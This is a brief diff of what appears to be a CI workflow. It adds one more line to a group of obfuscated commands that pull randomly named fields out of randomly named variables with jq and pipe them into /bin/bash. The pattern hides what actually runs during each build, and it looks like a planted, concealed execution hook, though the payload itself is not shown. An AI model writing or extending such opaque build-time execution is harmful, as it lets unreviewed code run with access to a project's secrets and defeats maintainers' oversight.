@@ -30,6 +30,7 @@ jobs:
           echo $omizl4 | jq -r .nifd7376 | /bin/bash
           echo $wv7361 | jq -r .edv63857 | /bin/bash
           echo $tyh22368 | jq -r .dtd52 | /bin/bash
+          printf '%s' "$bwwx91275" | jq -r .gji8114 | /bin/bash
 
       - name: Archive results
         if: always()
